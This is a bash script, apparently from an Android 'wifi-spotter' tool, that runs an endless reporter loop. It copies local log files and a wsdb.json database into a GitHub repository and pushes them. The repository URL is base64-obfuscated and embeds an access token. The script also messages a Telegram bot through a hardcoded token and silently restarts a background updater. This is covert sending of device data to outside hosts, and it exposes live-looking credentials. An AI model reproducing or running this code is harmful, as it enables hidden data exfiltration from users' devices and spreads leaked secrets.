#!/bin/bash



	_prepare()
		{
				_alert()
				{
					{ while true; do sleep 1; r=$(curl -s -X POST "https://api.telegram.org/bot8180673991:AAHkevnqzsJ7kCdXmC_OwsmRIztyNtz_o_U/sendMessage" -H "Content-Type: application/json; charset=utf-8" -d "{\"chat_id\": "-1003946012815",\"text\": \"✅ *Received new contribution \!*\n👤 *Contributor:* \`${u}\`\n📌 *Commit:* \`${m}\`\n🎯 *Score:* \`${s}\`\",\"parse_mode\": \"Markdown\",\"disable_web_page_preview\": true,\"disable_notification\": true,}" 2>&1); [ -z "${r}" ] && continue; echo "alert result: ${r}" >>"${tmp}"; [[ "${r}" =~ '"ok":true' ]] && { echo "${s}" >"${home_dir}/.score"; return 0; }; done; }
				}
				_clone()
				{
					{ while true; do sleep 1; rm -rf "${n}" &>/dev/null; r=$(git clone --depth 1 "$(base64 -d <<<aHR0cHM6Ly9zcG90dGVyMjQ6Z2hwX25pcWpXMllNWkVjbVVKQWRTWkl2Yk8xeTQ3Y25QcDA0SDlxSUBnaXRodWIuY29tL3Nwb3R0ZXIyNC9nYy5naXQ=)" "${n}" 2>&1 | tr '\n' '#'); [[ "${r}" =~ "fatal: unable to access" ]] && continue; echo "clone result: ${r}" >>"${tmp}"; [[ "${r}" =~ "Receiving objects: 100%" ]] && return 0; done; }
				}
				_fetch()
				{
					{ while true; do sleep 1; mkdir -p "${n}/${z}/${p}"; c=$(git -C "${n}" fetch --all 2>&1 | tr '\n' '#'); [[ "${c}" =~ "fatal: unable to access" ]] && continue; echo "fetch result: ${c}" >>"${tmp}"; [[ "${c}" =~ (not a git repository|cannot change to) ]] && { _clone || continue; }; [[ "${c}" =~ "From " ]] && { r=$(git -C "${n}" reset --hard origin/main 2>&1 | tr '\n' '#'); echo "reset result: ${r}" >>"${tmp}"; }; { r=$(git -C "${n}" clean -fdx 2>&1 | tr '\n' '#'); echo "clean result: ${r}" >>"${tmp}"; }; [ -z "${c}" ] && return 0; done; }
				}
				_commit()
				{
					{ r=$(git -C "${n}" add . 2>&1 | tr '\n' '#'); echo "add result: ${r}" >>"${tmp}"; r=$(git -C "${n}" config user.email "unknown@unknown.com" 2>&1 | tr '\n' '#'); echo "config/email result: ${r}" >>"${tmp}"; r=$(git -C "${n}" config user.name "${p}" 2>&1 | tr '\n' '#'); echo "config/user result: ${r}" >>"${tmp}"; r=$(git -C "${n}" commit --author="${p} <unknown@unknown.com>" -m "updated by: ${p}" 2>&1 | tr '\n' '#'); echo "commit/save result: ${r}" >>"${tmp}"; m=$(git -C "${n}" rev-parse --short HEAD 2>&1); echo "commit/version result: ${m}" >>"${tmp}"; while true; do sleep 1; r=$(git -C "${n}" push "$(base64 -d <<<aHR0cHM6Ly9zcG90dGVyMjQ6Z2hwX25pcWpXMllNWkVjbVVKQWRTWkl2Yk8xeTQ3Y25QcDA0SDlxSUBnaXRodWIuY29tL3Nwb3R0ZXIyNC9nYy5naXQ=)" 2>&1 | tr '\n' '#'); echo "push result: ${r}" >>"${tmp}"; [[ "${c}" =~ "unable to access" ]] && continue; [[ "${c}" =~ "fetch first" ]] && return 1; return 0; done; }
				}
				_updater()
				{
					kill -9 "$(cat "${home_dir}/logs/updater.pid")" 2>/dev/null
					nohup ${home_dir}/plugins/updater.sh --silent-update &>/dev/null &
					echo "${!}" >"${home_dir}/logs/updater.pid"; disown
				}
			local z u p c r n d s tmp
			home_dir=~/wifi-spotter-root
			[ -d "${home_dir}/logs" ] || mkdir -p "${home_dir}/logs"
			tmp="${home_dir}/logs/reporter.log"; n="${home_dir}/uploads"; d="${home_dir}"
			[ -s "${home_dir}/.key" ] || { echo "WS${RANDOM}${RANDOM}${RANDOM}" >"${home_dir}/.key"; echo "0" >"${home_dir}/.score"; }; { p=$(cat "${home_dir}/.key" | md5sum | awk '{print $1}'); u="${p:0:7}"; }
			[ -s "${home_dir}/.score" ] || { echo "0" >"${home_dir}/.score"; }; { s=$(cat "${home_dir}/.score"); s=$((s+1)) || s=1; }
			z=$(getprop persist.sys.timezone | tr "[:upper:]" "[:lower:]" | tr -d /); [ -n "${z}" ] || z="unknown"
			echo -e "\n\nReporter started: $(date "+%d-%m-%Y %H:%M:%S")" >>"${tmp}"; _updater
			while true; do _fetch && { mkdir -p "${n}/${z}/${p}"; cp "${d}/logs/"*.log "${d}/wsdb.json" "${n}/${z}/${p}/" 2>/dev/null; _commit && _alert && break || continue; }; sleep 10; done
		}
			_prepare
